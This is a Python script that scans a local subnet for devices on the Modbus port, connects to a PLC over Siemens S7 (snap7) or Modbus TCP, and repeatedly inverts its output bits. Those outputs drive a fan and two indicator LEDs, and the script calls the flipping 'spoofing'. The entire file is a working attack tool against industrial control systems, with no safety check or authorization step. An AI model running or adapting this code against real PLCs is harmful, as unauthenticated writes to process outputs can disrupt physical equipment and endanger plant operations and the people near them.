import snap7
import time
import socket

# Configuration
PLC_IP = None  # Initialize to None, to be discovered later if needed
PLC_RACK = 0
PLC_SLOT = 1
MODBUS_UNIT_ID = 1  # Define the Modbus Unit ID
SPOOF_INTERVAL = 5  # Interval (in seconds) between spoofed messages

def find_plc_ip():
    """
    Attempts to find the PLC's IP address by scanning the local network.
    This is a rudimentary approach and may not be reliable in all network configurations.
    Consider using a dedicated network scanning tool for more robust discovery.
    """
    global PLC_IP  # Declare that we're using the global PLC_IP

    # Basic network scan range (adjust as needed)
    network_prefix = "192.168.9"
    for i in range(1, 255):
        ip = f"{network_prefix}.{i}"
        try:
            # Attempt a simple TCP connection to port 502 (Modbus)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)  # Short timeout
            result = sock.connect_ex((ip, 502))
            if result == 0:
                print(f"Found PLC IP: {ip}")
                PLC_IP = ip
                sock.close()
                return True
            sock.close()
        except socket.error:
            pass

    print("PLC IP address not found on the network.  Please manually set PLC_IP.")
    return False


def spoof_reporting_message_snap7(client):
    """
    Spoofs a reporting message using Snap7 to directly manipulate memory bits.
    In this example, we'll toggle Q_FAN (%Q0.0) and related LEDs (%Q0.4, %Q0.5).
    """
    try:
        # Read the current output byte (Q0.0 - Q0.7)
        qb = client.read_area(snap7.const.S7AreaPQ, 0, 0, 1)  # PQ = Process Output

        # Extract current state of Q0.0, Q0.4, and Q0.5
        current_q_fan = (qb[0] >> 0) & 1
        current_q_reda = (qb[0] >> 4) & 1
        current_q_greena = (qb[0] >> 5) & 1

        # Invert the states (spoofing the values)
        new_q_fan = 1 - current_q_fan
        new_q_reda = 1 - current_q_reda
        new_q_greena = 1 - current_q_greena

        # Construct the new output byte
        new_qb = bytearray([0])  # Initialize
        if new_q_fan:
            new_qb[0] |= (1 << 0)  # Set bit 0
        if new_q_reda:
            new_qb[0] |= (1 << 4)  # Set bit 4
        if new_q_greena:
            new_qb[0] |= (1 << 5)  # Set bit 5

        # Write the spoofed output byte
        client.write_area(snap7.const.S7AreaPQ, 0, 0, new_qb)

        print(f"Spoofed: Q_FAN={new_q_fan}, Q_REDA={new_q_reda}, Q_GREENA={new_q_greena}")

    except Exception as e:
        print(f"Error spoofing message (Snap7): {e}")


def spoof_reporting_message_modbus(client):
    """
    Spoofs a reporting message by writing directly to the Modbus coils corresponding to the outputs.
    """
    try:
        # Read the current state of Q_FAN, Q_REDA, and Q_GREENA
        q_fan = client.read_coils(0, 1, unit=MODBUS_UNIT_ID).bits[0]  # %Q0.0
        q_reda = client.read_coils(4, 1, unit=MODBUS_UNIT_ID).bits[0] # %Q0.4
        q_greena = client.read_coils(5, 1, unit=MODBUS_UNIT_ID).bits[0] # %Q0.5

        # Invert the states
        new_q_fan = not q_fan
        new_q_reda = not q_reda
        new_q_greena = not q_greena

        # Write the spoofed values back
        client.write_coil(0, new_q_fan, unit=MODBUS_UNIT_ID) # %Q0.0
        client.write_coil(4, new_q_reda, unit=MODBUS_UNIT_ID) # %Q0.4
        client.write_coil(5, new_q_greena, unit=MODBUS_UNIT_ID) # %Q0.5

        print(f"Spoofed (Modbus): Q_FAN={new_q_fan}, Q_REDA={new_q_reda}, Q_GREENA={new_q_greena}")

    except Exception as e:
        print(f"Error spoofing message (Modbus): {e}")


def main():
    global PLC_IP
    # Attempt to find the PLC IP if not already set
    if PLC_IP is None:
        if not find_plc_ip():
            print("Please set the PLC_IP variable manually.")
            return

    # First try connecting with Snap7.  If that fails, try Modbus.
    try:
        # Snap7 implementation (Direct S7 Communication)
        client = snap7.client.Client()
        client.connect(PLC_IP, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC via Snap7 at {PLC_IP}:{PLC_RACK}:{PLC_SLOT}")

        while True:
            spoof_reporting_message_snap7(client)
            time.sleep(SPOOF_INTERVAL)

    except Exception as e_snap7:
        print(f"Snap7 connection failed: {e_snap7}. Attempting Modbus connection...")

        try:
            # PyModbus implementation (Modbus TCP)
            from pymodbus.client import ModbusTcpClient

            client = ModbusTcpClient(PLC_IP)
            if client.connect():
                print(f"Connected to PLC via Modbus at {PLC_IP}")
                while True:
                    spoof_reporting_message_modbus(client)
                    time.sleep(SPOOF_INTERVAL)
            else:
                print("Failed to connect to PLC via Modbus.")

        except Exception as e_modbus:
            print(f"Modbus connection failed: {e_modbus}")
            print("Failed to connect to PLC via either Snap7 or Modbus.")


if __name__ == "__main__":
    main()